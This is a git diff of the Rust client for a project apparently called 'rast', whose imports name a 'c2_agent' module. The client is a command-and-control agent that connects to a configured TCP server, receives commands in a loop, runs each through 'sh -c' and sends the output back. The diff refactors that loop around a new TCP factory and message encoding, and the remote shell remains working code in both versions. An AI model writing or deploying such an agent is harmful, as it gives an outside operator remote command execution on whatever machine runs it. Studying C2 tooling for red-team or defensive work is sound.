@@ -1,6 +1,8 @@
-use std::{io::Result, net::SocketAddr, process::Command};
+use std::{net::SocketAddr, process::Command, sync::Arc};
 
+use anyhow::Result;
 use rast::{
+    messages::c2_agent::c2_agent::{create_message, get_message},
     protocols::{tcp::*, *},
     settings::*,
 };
@@ -10,37 +12,39 @@ async fn main() -> Result<()> {
     println!("Hello from client!");
 
     // TODO: add embedding during compile
-    let conf = match Settings::new() {
-        Ok(conf) => {
-            println!("{:?}", conf);
-            conf
+    let settings = match Settings::new() {
+        Ok(settings) => {
+            println!("{:?}", settings);
+            settings
         },
         Err(e) => {
             panic!("{:?}", e);
         },
     };
 
-    let address = SocketAddr::new(conf.server.ip, conf.server.port);
-    let mut client: Box<dyn ProtoClient<Conf = TcpConf>> =
-        Box::new(TcpClient::new_client(address, None).await?);
+    if let Some(conf) = &settings.server.tcp {
+        let mut client = TcpFactory::new_client(conf).await?;
+
+        loop {
+            let cmd = Arc::get_mut(&mut client).unwrap().recv().await?;
+            let cmd = get_message(cmd).unwrap();
+            let cmd = cmd.trim_end_matches('\0');
+
+            let output = Command::new("sh").arg("-c").arg(cmd).output()?;
+            let mut output = String::from_utf8_lossy(&output.stdout).to_string();
+
+            if output.is_empty() {
+                output.push('\n');
+            }
+
+            let msg = create_message(&output);
+            Arc::get_mut(&mut client).unwrap().send(msg).await?;
+        }
+    };
 
     // let msg_s = "Checking in!";
     // client.send(msg_s.to_string()).await?;
     // println!("Message sent: {}", msg_s);
 
-    loop {
-        let cmd = client.recv().await?;
-        let cmd = cmd.trim_end_matches('\0');
-
-        let output = Command::new("sh").arg("-c").arg(cmd).output()?;
-        let mut output = String::from_utf8_lossy(&output.stdout).to_string();
-
-        if output.is_empty() {
-            output.push('\n');
-        }
-
-        client.send(output).await?;
-    }
-
-    // Ok(())
+    Ok(())
 }
